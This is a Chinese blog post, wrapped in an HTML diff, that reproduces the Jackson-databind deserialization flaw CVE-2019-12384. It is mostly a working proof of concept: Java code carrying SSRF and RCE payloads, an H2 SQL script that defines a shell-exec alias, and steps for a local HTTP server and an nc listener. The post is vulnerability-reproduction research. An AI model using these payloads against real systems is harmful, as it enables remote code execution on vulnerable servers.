@@ -1,0 +1,380 @@
+<!DOCTYPE html>
+<html lang="zh-cn">
+    <head>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="robots" content="noodp" />
+        <meta http-equiv="X-UA-Compatible" content="IE=edge, chrome=1">
+        <title>CVE-2019-12384：Jackson反序列化漏洞复现 - Geekby&#39;s Blog</title><meta name="Description" content="CVE-2019-12384：Jackson反序列化漏洞复现"><meta property="og:title" content="CVE-2019-12384：Jackson反序列化漏洞复现" />
+<meta property="og:description" content="CVE-2019-12384：Jackson反序列化漏洞复现" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://www.geekby.site/2019/07/jackson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" /><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2019-07-26T13:00:00+08:00" />
+<meta property="article:modified_time" content="2019-07-26T13:00:00+08:00" />
+
+<meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="CVE-2019-12384：Jackson反序列化漏洞复现"/>
+<meta name="twitter:description" content="CVE-2019-12384：Jackson反序列化漏洞复现"/>
+<meta name="application-name" content="Geekby&#39;s Blog">
+<meta name="apple-mobile-web-app-title" content="Geekby&#39;s Blog"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+        <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="https://www.geekby.site/2019/07/jackson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" /><link rel="prev" href="https://www.geekby.site/2019/07/%E7%BB%84%E7%AD%96%E7%95%A5%E4%B8%8Eacl/" /><link rel="next" href="https://www.geekby.site/2019/07/%E5%AE%9A%E4%BD%8D%E5%9F%9F%E7%AE%A1%E7%90%86%E5%91%98/" /><link rel="stylesheet" href="/lib/normalize/normalize.min.css"><link rel="stylesheet" href="/css/style.min.css"><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"><link rel="stylesheet" href="/lib/animate/animate.min.css"><script type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "BlogPosting",
+        "headline": "CVE-2019-12384：Jackson反序列化漏洞复现",
+        "inLanguage": "zh-cn",
+        "mainEntityOfPage": {
+            "@type": "WebPage",
+            "@id": "https:\/\/www.geekby.site\/2019\/07\/jackson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0\/"
+        },"image": ["https:\/\/www.geekby.site\/logo.png"],"genre": "posts","keywords": "Jackson-databind, 漏洞复现","wordcount":  189 ,
+        "url": "https:\/\/www.geekby.site\/2019\/07\/jackson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0\/","datePublished": "2019-07-26T13:00:00+08:00","dateModified": "2019-07-26T13:00:00+08:00","publisher": {
+            "@type": "Organization",
+            "name": "Geekby","logo": {
+                    "@type": "ImageObject",
+                    "url": "https:\/\/www.geekby.site\/images\/avatar.png",
+                    "width":  358 ,
+                    "height":  330 
+                }},"author": {
+                "@type": "Person",
+                "name": "Geekby"
+            },"description": "CVE-2019-12384：Jackson反序列化漏洞复现"
+    }
+    </script></head>
+    <body header-desktop="" header-mobile=""><script type="text/javascript">(window.localStorage && localStorage.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('auto' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'auto' === 'dark')) && document.body.setAttribute('theme', 'dark');</script>
+
+        <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
+    <div class="header-wrapper">
+        <div class="header-title">
+            <a href="/" title="Geekby&#39;s Blog">Geekby&#39;s Blog</a>
+        </div>
+        <div class="menu">
+            <div class="menu-inner"><a class="menu-item" href="/posts/" title="文章"><i class="fas fa-inbox"></i> 文章 </a><a class="menu-item" href="/tags/" title="标签"><i class="fas fa-tags"></i> 标签 </a><a class="menu-item" href="/categories/" title="分类"><i class="fas fa-sort-amount-up-alt"></i> 分类 </a><a class="menu-item" href="/about/" title="关于"><i class="far fa-address-card"></i> 关于 </a><span class="menu-item delimiter"></span><span class="menu-item search" id="search-desktop">
+                        <input type="text" placeholder="输入关键字" id="search-input-desktop">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="搜索">
+                            <i class="fas fa-search fa-fw"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="清空">
+                            <i class="fas fa-times-circle fa-fw"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-desktop">
+                            <i class="fas fa-spinner fa-fw fa-spin"></i>
+                        </span>
+                    </span><a href="javascript:void(0);" class="menu-item theme-switch" title="切换主题">
+                    <i class="fas fa-adjust fa-fw"></i>
+                </a>
+            </div>
+        </div>
+    </div>
+</header><header class="mobile" id="header-mobile">
+    <div class="header-container">
+        <div class="header-wrapper">
+            <div class="header-title">
+                <a href="/" title="Geekby&#39;s Blog">Geekby&#39;s Blog</a>
+            </div>
+            <div class="menu-toggle" id="menu-toggle-mobile">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+        <div class="menu" id="menu-mobile"><div class="search-wrapper">
+                    <div class="search mobile" id="search-mobile">
+                        <input type="text" placeholder="输入关键字" id="search-input-mobile">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="搜索">
+                            <i class="fas fa-search fa-fw"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="清空">
+                            <i class="fas fa-times-circle fa-fw"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-mobile">
+                            <i class="fas fa-spinner fa-fw fa-spin"></i>
+                        </span>
+                    </div>
+                    <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
+                        取消
+                    </a>
+                </div><a class="menu-item" href="/posts/" title="文章"><i class="fas fa-inbox"></i>文章</a><a class="menu-item" href="/tags/" title="标签"><i class="fas fa-tags"></i>标签</a><a class="menu-item" href="/categories/" title="分类"><i class="fas fa-sort-amount-up-alt"></i>分类</a><a class="menu-item" href="/about/" title="关于"><i class="far fa-address-card"></i>关于</a><a href="javascript:void(0);" class="menu-item theme-switch" title="切换主题">
+                <i class="fas fa-adjust fa-fw"></i>
+            </a></div>
+    </div>
+</header>
+<div class="search-dropdown desktop">
+    <div id="search-dropdown-desktop"></div>
+</div>
+<div class="search-dropdown mobile">
+    <div id="search-dropdown-mobile"></div>
+</div>
+<main class="main">
+                <div class="container"><div class="toc" id="toc-auto">
+            <h2 class="toc-title">目录</h2>
+            <div class="toc-content" id="toc-content-auto"></div>
+        </div><article class="page single"><h1 class="single-title animated flipInX">CVE-2019-12384：Jackson反序列化漏洞复现</h1><div class="post-meta">
+            <div class="post-meta-line"><span class="post-author"><a href="/" title="Author" rel=" author" class="author"><i class="fas fa-user-circle fa-fw"></i>Geekby</a></span>&nbsp;<span class="post-category">收录于 <a href="/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"><i class="far fa-folder fa-fw"></i>漏洞复现</a></span></div>
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw"></i>&nbsp;<time datetime="2019-07-26">2019-07-26</time>&nbsp;<i class="fas fa-pencil-alt fa-fw"></i>&nbsp;约 189 字&nbsp;
+                <i class="far fa-clock fa-fw"></i>&nbsp;预计阅读 1 分钟&nbsp;</div>
+        </div><div class="details toc" id="toc-static"  kept="">
+                <div class="details-summary toc-title">
+                    <span>目录</span>
+                    <span><i class="details-icon fas fa-angle-right"></i></span>
+                </div>
+                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#分析">分析</a></li>
+    <li><a href="#环境搭建">环境搭建</a>
+      <ul>
+        <li><a href="#漏洞代码">漏洞代码</a></li>
+        <li><a href="#构建步骤">构建步骤</a></li>
+      </ul>
+    </li>
+    <li><a href="#攻击流程">攻击流程</a>
+      <ul>
+        <li><a href="#rce-payload测试">RCE payload测试</a></li>
+        <li><a href="#ssrf-payload测试">SSRF payload测试</a></li>
+      </ul>
+    </li>
+    <li><a href="#参考">参考</a></li>
+  </ul>
+</nav></div>
+            </div><div class="content" id="content"><h1 id="cve-2019-12384jackson反序列化漏洞复现">CVE-2019-12384：Jackson反序列化漏洞复现</h1>
+<h2 id="分析">分析</h2>
+<p>根据Jackson开发者提到的信息，触发这个Jackson漏洞需要满足如下要求，所以该漏洞评级为中危：</p>
+<ol>
+<li>目标应用接收到不可信客户端发送的JSON数据</li>
+<li>目标应用使用多态类型处理方式来处理java.lang.Object类型的属性；</li>
+<li>目标应用至少包含能够在Java classpath中利用的一个“gadget”类。在该漏洞中就是依赖的第三方jar包有点多，除去jackson自身的jar包以外还需要logback-core和h2；</li>
+</ol>
+<h2 id="环境搭建">环境搭建</h2>
+<p>本文中用到的第三方库有：</p>
+<ul>
+<li>jackson-databind 2.9.8</li>
+<li>jackson-annotations-2.9.8.jar</li>
+<li>jackson-core-2.9.8.jar</li>
+<li>logback-core-1.3.0-alpha4.jar</li>
+<li>h2 1.4.199</li>
+</ul>
+<p>在<a href="http://www.mvnrepository.com" target="_blank" rel="noopener noreffer">http://www.mvnrepository.com</a>上下载即可。</p>
+<h3 id="漏洞代码">漏洞代码</h3>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span><span class="lnt">46
+</span><span class="lnt">47
+</span><span class="lnt">48
+</span><span class="lnt">49
+</span><span class="lnt">50
+</span><span class="lnt">51
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="kn">package</span> <span class="nn">com.baiyang</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">com.fasterxml.jackson.databind.ObjectMapper</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">com.fasterxml.jackson.databind.SerializationFeature</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">org.h2.Driver</span><span class="o">;</span>
+
+<span class="kd">public</span> <span class="kd">class</span> <span class="nc">Main</span> <span class="o">{</span>
+
+    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">main</span><span class="o">(</span><span class="n">String</span><span class="o">[]</span> <span class="n">args</span><span class="o">)</span> <span class="o">{</span>
+        <span class="k">try</span> <span class="o">{</span>
+            <span class="n">Class</span><span class="o">.</span><span class="na">forName</span><span class="o">(</span><span class="s">&#34;org.h2.Driver&#34;</span><span class="o">).</span><span class="na">newInstance</span><span class="o">();</span>
+        <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">Exception</span> <span class="n">e</span><span class="o">)</span> <span class="o">{</span>
+            <span class="n">e</span><span class="o">.</span><span class="na">printStackTrace</span><span class="o">();</span>
+        <span class="o">}</span>
+
+
+        <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="s">&#34;Mapping&#34;</span><span class="o">);</span>
+
+        <span class="c1">//该条payload用于SSRF的复现
+</span><span class="c1"></span>
+        <span class="n">String</span> <span class="n">SSRF</span> <span class="o">=</span> <span class="s">&#34;[\&#34;ch.qos.logback.core.db.DriverManagerConnectionSource\&#34;, {\&#34;url\&#34;:\&#34;jdbc:h2:tcp://127.0.0.1:4444/~/hacker\&#34;}]&#34;</span><span class="o">;</span>
+
+        <span class="c1">//该条payload用于RCE的复现
+</span><span class="c1"></span>
+        <span class="n">String</span> <span class="n">RCE</span> <span class="o">=</span> <span class="s">&#34;[\&#34;ch.qos.logback.core.db.DriverManagerConnectionSource\&#34;, {\&#34;url\&#34;:\&#34;jdbc:h2:mem:;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM &#39;http://localhost/inject.sql&#39;\&#34;}]&#34;</span><span class="o">;</span>
+
+        <span class="n">ObjectMapper</span> <span class="n">mapper</span> <span class="o">=</span> <span class="k">new</span> <span class="n">ObjectMapper</span><span class="o">();</span>
+
+        <span class="n">mapper</span><span class="o">.</span><span class="na">enableDefaultTyping</span><span class="o">();</span>
+
+        <span class="n">mapper</span><span class="o">.</span><span class="na">configure</span><span class="o">(</span><span class="n">SerializationFeature</span><span class="o">.</span><span class="na">FAIL_ON_EMPTY_BEANS</span><span class="o">,</span> <span class="kc">false</span><span class="o">);</span>
+
+        <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="s">&#34;Serializing&#34;</span><span class="o">);</span>
+        <span class="n">Object</span> <span class="n">obj</span> <span class="o">=</span> <span class="kc">null</span><span class="o">;</span>
+        <span class="k">try</span> <span class="o">{</span>
+            <span class="c1">//更换SSRF或RCE即可测试SSRF或者RCE漏洞的payload
+</span><span class="c1"></span>            <span class="n">obj</span> <span class="o">=</span> <span class="n">mapper</span><span class="o">.</span><span class="na">readValue</span><span class="o">(</span><span class="n">RCE</span><span class="o">,</span> <span class="n">java</span><span class="o">.</span><span class="na">lang</span><span class="o">.</span><span class="na">Object</span><span class="o">.</span><span class="na">class</span><span class="o">);</span>
+        <span class="o">}</span> <span class="k">catch</span><span class="o">(</span><span class="n">Exception</span> <span class="n">e</span><span class="o">)</span> <span class="o">{</span>
+            <span class="n">e</span><span class="o">.</span><span class="na">printStackTrace</span><span class="o">();</span>
+        <span class="o">}</span>
+
+        <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="s">&#34;objectified&#34;</span><span class="o">);</span>
+
+        <span class="k">try</span> <span class="o">{</span>
+            <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="s">&#34;stringified: &#34;</span> <span class="o">+</span> <span class="n">mapper</span><span class="o">.</span><span class="na">writeValueAsString</span><span class="o">(</span><span class="n">obj</span><span class="o">));</span>
+        <span class="o">}</span> <span class="k">catch</span><span class="o">(</span><span class="n">Exception</span> <span class="n">e</span><span class="o">)</span> <span class="o">{</span>
+            <span class="n">e</span><span class="o">.</span><span class="na">printStackTrace</span><span class="o">();</span>
+        <span class="o">}</span>
+
+    <span class="o">}</span>
+<span class="o">}</span>
+
+</code></pre></td></tr></table>
+</div>
+</div><h3 id="构建步骤">构建步骤</h3>
+<p>本文在IDEA上生成项目</p>
+<ol>
+<li>新建java Commandline项目</li>
+<li>将上述代码替换类</li>
+<li>单击红框中的图标，进入项目结构设置
+<img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190726153817.png-water_print"
+        data-srcset="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190726153817.png-water_print, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190726153817.png-water_print 1.5x, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190726153817.png-water_print 2x"
+        data-sizes="auto"
+        alt="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190726153817.png-water_print"
+        title="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190726153817.png-water_print" /></li>
+<li>按照下图的步骤将下载好的外部jar包导入项目文件
+<img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190726153826.png-water_print"
+        data-srcset="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190726153826.png-water_print, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190726153826.png-water_print 1.5x, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190726153826.png-water_print 2x"
+        data-sizes="auto"
+        alt="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190726153826.png-water_print"
+        title="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190726153826.png-water_print" /></li>
+</ol>
+<h2 id="攻击流程">攻击流程</h2>
+<ol>
+<li>将下面的sql脚本文件保存为<code>inject.sql</code></li>
+</ol>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="k">CREATE</span><span class="w"> </span><span class="k">ALIAS</span><span class="w"> </span><span class="n">SHELLEXEC</span><span class="w"> </span><span class="k">AS</span><span class="w"> </span><span class="err">$$</span><span class="w"> </span><span class="n">String</span><span class="w"> </span><span class="n">shellexec</span><span class="p">(</span><span class="n">String</span><span class="w"> </span><span class="n">cmd</span><span class="p">)</span><span class="w"> </span><span class="n">throws</span><span class="w"> </span><span class="n">java</span><span class="p">.</span><span class="n">io</span><span class="p">.</span><span class="n">IOException</span><span class="w"> </span><span class="err">{</span><span class="w">
+</span><span class="w">        </span><span class="n">String</span><span class="p">[]</span><span class="w"> </span><span class="n">command</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="err">{</span><span class="s2">&#34;bash&#34;</span><span class="p">,</span><span class="w"> </span><span class="s2">&#34;-c&#34;</span><span class="p">,</span><span class="w"> </span><span class="n">cmd</span><span class="err">}</span><span class="p">;</span><span class="w">
+</span><span class="w">        </span><span class="n">java</span><span class="p">.</span><span class="n">util</span><span class="p">.</span><span class="n">Scanner</span><span class="w"> </span><span class="n">s</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">java</span><span class="p">.</span><span class="n">util</span><span class="p">.</span><span class="n">Scanner</span><span class="p">(</span><span class="n">Runtime</span><span class="p">.</span><span class="n">getRuntime</span><span class="p">().</span><span class="k">exec</span><span class="p">(</span><span class="n">command</span><span class="p">).</span><span class="n">getInputStream</span><span class="p">()).</span><span class="n">useDelimiter</span><span class="p">(</span><span class="s2">&#34;\\A&#34;</span><span class="p">);</span><span class="w">
+</span><span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="n">s</span><span class="p">.</span><span class="n">hasNext</span><span class="p">()</span><span class="w"> </span><span class="o">?</span><span class="w"> </span><span class="n">s</span><span class="p">.</span><span class="k">next</span><span class="p">()</span><span class="w"> </span><span class="p">:</span><span class="w"> </span><span class="s2">&#34;&#34;</span><span class="p">;</span><span class="w">  </span><span class="err">}</span><span class="w">
+</span><span class="w"></span><span class="err">$$</span><span class="p">;</span><span class="w">
+</span><span class="w"></span><span class="k">CALL</span><span class="w"> </span><span class="n">SHELLEXEC</span><span class="p">(</span><span class="s1">&#39;open /Applications/Calculator.app&#39;</span><span class="p">)</span><span class="w">
+</span></code></pre></td></tr></table>
+</div>
+</div><p><code>注</code>：本文在MacOS下执行的RCE，如在其它环境，请自行更换CALL SHELLEXEC中的命令。</p>
+<ol start="2">
+<li>执行本地执行python2 -m SimpleHTTPServer 80，在本地启动HTTP服务</li>
+</ol>
+<h3 id="rce-payload测试">RCE payload测试</h3>
+<p>将java文件中的payload更换为<code>RCE</code>，编译并运行java程序
+<img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190726154643.png-water_print"
+        data-srcset="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190726154643.png-water_print, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190726154643.png-water_print 1.5x, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190726154643.png-water_print 2x"
+        data-sizes="auto"
+        alt="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190726154643.png-water_print"
+        title="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190726154643.png-water_print" /></p>
+<h3 id="ssrf-payload测试">SSRF payload测试</h3>
+<ol>
+<li>执行<code>nc -l -vv 4444</code>，便于观察SSRF的结果</li>
+<li>将java文件中的payload更换为<code>SSRF</code>，编译并运行java程序
+<img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190726155103.png-water_print"
+        data-srcset="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190726155103.png-water_print, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190726155103.png-water_print 1.5x, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190726155103.png-water_print 2x"
+        data-sizes="auto"
+        alt="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190726155103.png-water_print"
+        title="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190726155103.png-water_print" /></li>
+</ol>
+<h2 id="参考">参考</h2>
+<ul>
+<li><a href="https://blog.doyensec.com/2019/07/22/jackson-gadgets.html" target="_blank" rel="noopener noreffer">https://blog.doyensec.com/2019/07/22/jackson-gadgets.html</a></li>
+<li><a href="https://www.anquanke.com/post/id/182695" target="_blank" rel="noopener noreffer">https://www.anquanke.com/post/id/182695</a></li>
+</ul>
+</div><div class="post-footer" id="post-footer">
+    <div class="post-info">
+        <div class="post-info-line">
+            <div class="post-info-mod">
+                <span>更新于 2019-07-26</span>
+            </div>
+            <div class="post-info-license"></div>
+        </div>
+        <div class="post-info-line">
+            <div class="post-info-md"></div>
+            <div class="post-info-share">
+                <span><a href="javascript:void(0);" title="分享到 微博" data-sharer="weibo" data-url="https://www.geekby.site/2019/07/jackson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" data-title="CVE-2019-12384：Jackson反序列化漏洞复现"><i class="fab fa-weibo fa-fw"></i></a><a href="javascript:void(0);" title="分享到 Evernote" data-sharer="evernote" data-url="https://www.geekby.site/2019/07/jackson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" data-title="CVE-2019-12384：Jackson反序列化漏洞复现"><i class="fab fa-evernote fa-fw"></i></a><a href="javascript:void(0);" title="分享到 Skype" data-sharer="skype" data-url="https://www.geekby.site/2019/07/jackson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" data-title="CVE-2019-12384：Jackson反序列化漏洞复现"><i class="fab fa-skype fa-fw"></i></a></span>
+            </div>
+        </div>
+    </div>
+
+    <div class="post-info-more">
+        <section class="post-tags"><i class="fas fa-tags fa-fw"></i>&nbsp;<a href="/tags/jackson-databind/">Jackson-databind</a>,&nbsp;<a href="/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/">漏洞复现</a></section>
+        <section>
+            <span><a href="javascript:void(0);" onclick="window.history.back();">返回</a></span>&nbsp;|&nbsp;<span><a href="/">主页</a></span>
+        </section>
+    </div>
+
+    <div class="post-nav"><a href="/2019/07/%E7%BB%84%E7%AD%96%E7%95%A5%E4%B8%8Eacl/" class="prev" rel="prev" title="组策略与ACL"><i class="fas fa-angle-left fa-fw"></i>组策略与ACL</a>
+            <a href="/2019/07/%E5%AE%9A%E4%BD%8D%E5%9F%9F%E7%AE%A1%E7%90%86%E5%91%98/" class="next" rel="next" title="定位域管理员">定位域管理员<i class="fas fa-angle-right fa-fw"></i></a></div>
+</div>
+</article></div>
+            </main><footer class="footer">
+        <div class="footer-container"><div class="footer-line"><i class="far fa-copyright fa-fw"></i><span itemprop="copyrightYear">2019 - 2021</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="/" target="_blank">Geekby</a></span>&nbsp;|&nbsp;<span class="license"><a rel="license external nofollow noopener noreffer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span></div>
+        </div>
+    </footer></div>
+
+        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="回到顶部">
+                <i class="fas fa-arrow-up fa-fw"></i>
+            </a><a href="#" id="view-comments" class="fixed-button" title="查看评论">
+                <i class="fas fa-comment fa-fw"></i>
+            </a>
+        </div><link rel="stylesheet" href="/lib/lightgallery/lightgallery.min.css"><script type="text/javascript" src="/lib/smooth-scroll/smooth-scroll.min.js"></script><script type="text/javascript" src="/lib/autocomplete/autocomplete.min.js"></script><script type="text/javascript" src="/lib/algoliasearch/algoliasearch-lite.umd.min.js"></script><script type="text/javascript" src="/lib/lazysizes/lazysizes.min.js"></script><script type="text/javascript" src="/lib/lightgallery/lightgallery.min.js"></script><script type="text/javascript" src="/lib/lightgallery/lg-thumbnail.min.js"></script><script type="text/javascript" src="/lib/lightgallery/lg-zoom.min.js"></script><script type="text/javascript" src="/lib/clipboard/clipboard.min.js"></script><script type="text/javascript" src="/lib/sharer/sharer.min.js"></script><script type="text/javascript">window.config={"code":{"copyTitle":"复制到剪贴板","maxShownLines":100},"comment":{},"lightGallery":{"actualSize":false,"exThumbImage":"data-thumbnail","hideBarsDelay":2000,"selector":".lightgallery","speed":400,"thumbContHeight":80,"thumbWidth":80,"thumbnail":true},"search":{"algoliaAppID":"C19A58DMI2","algoliaIndex":"blog","algoliaSearchKey":"a7203b4397475a3fcf49cea4495e0987","highlightTag":"em","maxResultLength":10,"noResultsFound":"没有找到结果","snippetLength":50,"type":"algolia"}};</script><script type="text/javascript" src="/js/theme.min.js"></script></body>
+</html>
